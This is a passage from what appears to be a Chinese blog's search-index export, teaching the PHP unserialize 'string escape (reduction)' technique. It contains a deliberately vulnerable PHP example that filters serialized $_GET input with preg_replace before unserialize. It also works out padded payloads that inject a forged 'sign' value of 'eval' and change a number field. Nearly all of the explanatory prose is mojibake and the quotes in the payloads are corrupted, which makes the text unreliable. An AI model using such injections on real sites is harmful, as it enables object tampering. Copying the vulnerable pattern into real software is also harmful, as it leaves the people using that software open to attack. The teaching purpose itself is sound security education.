‡ã€‚</span><br></code></pre></td></tr></table></figure><p>æ€æƒ³å°±æ˜¯æˆ‘ä»¬è¦é€ƒé€¸å‡ºæ¥çš„å­—ç¬¦ä¸²æ˜¯â€;s:4:â€passâ€;s:6:â€hackerâ€;} æ€»å…±27ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦é€ƒé€¸27ä¸ªå­—ç¬¦ä¸²å‡ºæ¥ï¼Œä¹‹å‰æ˜¯2bé€ƒé€¸å‡ºæ¥ä¸€ä¸ªï¼Œé‚£ä¹ˆè¿™éœ€è¦é€ƒé€¸27ä¸ªï¼Œä¹Ÿå°±éœ€è¦54bã€‚</p><h1 id="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‡å°‘-ï¼ˆé€ƒé€¸å‡å°‘ï¼‰"><a href="#æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‡å°‘-ï¼ˆé€ƒé€¸å‡å°‘ï¼‰" class="headerlink" title="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‡å°‘  ï¼ˆé€ƒé€¸å‡å°‘ï¼‰"></a>æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å‡å°‘  ï¼ˆé€ƒé€¸å‡å°‘ï¼‰</h1><p>å­—ç¬¦ä¸²é€ƒé€¸å‡å°‘å°±æ˜¯å­—ç¬¦ä¸²ç»è¿‡ä¸€äº›å˜åŒ–åï¼Œå­—ç¬¦é•¿åº¦å‡å°‘ï¼ŒåŸæ¥çš„åŠŸèƒ½æ€§ä»£ç å˜æˆæ™®é€šçš„å­—ç¬¦ä¸²ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨é€ƒé€¸è¿›è¡Œæ„é€ ä¸€äº›æ¶æ„çš„ä»£ç ã€‚</p><p>ä¸‹é¢æ¥ä¸€ä¸ªä¾‹å­çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/php|test/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;sign&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sign&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;number&#x27;</span>]=<span class="hljs-string">&#x27;2020&#x27;</span>;<br><span class="hljs-variable">$temp</span>=<span class="hljs-title function_ invoke__">str_rep</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-variable">$fake</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç éƒ½æ˜¯ä¸Šé¢å¸ˆå‚…é‡Œé¢æ¼”ç¤ºçš„ï¼Œè¿™é‡Œæˆ‘æ˜¯æ ¹æ®è‡ªå·±çš„ç†è§£æ¥è®²ä¸€ä¸‹ã€‚</p><p>æŠŠè¿™æ®µä»£ç æ”¾åœ¨æœ¬åœ°ï¼Œå¯ä»¥çœ‹åˆ°ç»“æœä¸ºï¼š</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°nameå’Œsigné‡Œé¢éƒ½æ˜¯æ²¡æœ‰å†…å®¹çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯Nã€‚</p><p>ç„¶åæˆ‘ä»¬çœ‹åˆ°ä»£ç ä¸­çš„str_rep()å‡½æ•°ï¼Œæ˜¯å°†å˜é‡stringä¸­çš„phpå’Œtestæ›¿æ¢æˆç©ºã€‚</p><p>ç„¶åä¸‹é¢æœ‰ä¸€ä¸ªç»è¿‡è¿™æ®µå‡½æ•°çš„ååºåˆ—åŒ–ï¼Œè¿™é‡Œå°±æ„æˆäº†ååºåˆ—åŒ–é€ƒé€¸å‡å°‘çš„æ¼æ´ã€‚</p><p>ååºåˆ—åŒ–é€ƒé€¸å‡å°‘ä¸åŒäºå¢åŠ ã€‚</p><p>å¢åŠ æ˜¯çœ‹è¦æ„é€ çš„æ¶æ„ä»£ç å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¤šå°‘ï¼Œå°±ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå¦‚æœåŒ¹é…åˆ°äº†bb,å‡½æ•°æ˜¯æŠŠå®ƒæ›¿æ¢æˆcccï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ¯ä¸€ä¸ªbbå¯ä»¥é€ƒé€¸å‡º1ä¸ªå­—ç¬¦ï¼Œå¦‚æœæˆ‘ä»¬è¦æ„é€ çš„æ¶æ„ä»£ç é•¿åº¦æ˜¯27ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦54ä¸ªbbã€‚</p><p>è€Œå‡å°‘æˆ‘ä¸ªäººæ„Ÿè§‰æ˜¯æ¯”å¢åŠ å¤æ‚ä¸€ç‚¹ï¼Œä½†ä¹Ÿä¸å¤šã€‚æ‹¿ä¸Šé¢çš„ä»£ç è¿›è¡Œæ¼”ç¤ºï¼Œå¦‚æœæˆ‘æƒ³è®©signçš„å€¼æ˜¯evalï¼Œå¹¶ä¸”æ•°å­—æ”¹æˆ2023ï¼Œé‚£ä¹ˆè¿™å°±åˆ©ç”¨åˆ°äº†å­—ç¬¦ä¸²é€ƒé€¸å‡å°‘ã€‚</p><p>é¦–å…ˆæ„é€ æˆ‘ä»¬è¦å®ç°çš„ç›®æ ‡ã€‚â€;s:4:â€signâ€;s:4:â€evalâ€;s:6:â€numberâ€;s:4:â€2023â€;}  </p><p>å‡å°‘é€ƒé€¸æ˜¯è®©ä¸€äº›åŠŸèƒ½æ€§ä»£ç å˜æˆå­—ç¬¦ä¸²ï¼Œè¿™é‡Œæ˜¯è®©signå˜æˆå­—ç¬¦ä¸²ï¼Œè€Œåé¢æ„é€ çš„signå’Œnumberåˆ™æˆä¸ºæ–°çš„åŠŸèƒ½æ€§ä»£ç ã€‚</p><p>â€œ;s:4:â€signâ€;s:xx:â€å‰é¢çš„å­—ç¬¦ä¸€å…±æœ‰19ä¸ªï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨phpï¼Œå¦å¤–ä¸€ç§æ˜¯åˆ©ç”¨teståªä¸è¿‡éƒ½éœ€è¦å¡«å……å­—ç¬¦ç½¢äº†   â€œ;s:4:â€signâ€;s:4:â€evalâ€;s:6:â€numberâ€;s:4:â€2023â€;} </p><p>â€œ;s:4:â€signâ€;s:xx:â€è¿™é‡Œæ˜¯éœ€è¦å¡«å……çš„å­—ç¬¦â€;s:4:â€signâ€;s:4:â€evalâ€;s:6:â€numberâ€;s:4:â€2023â€;} </p><p>å¦‚æœç”¨7ä¸ªphpï¼Œä¹Ÿå°±æ˜¯å¯ä»¥é€ƒé€¸21ä¸ªï¼Œä¸Šé¢æ˜¯19ä¸ªï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¡«å……2ä¸ªå­—ç¬¦ã€‚</p><p>å¦‚æœç”¨5ä¸ªtest,é€ƒé€¸20ä¸ªï¼Œéœ€è¦å¡«å……ä¸€ä¸ªå­—ç¬¦ã€‚</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p><img src="https://s2.loli.net/2023/08/18/NeRMEVlk6cOAqYr.png" alt="image-20230523220226399.png">ç»“æœå¦‚ä¸Šã€‚</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
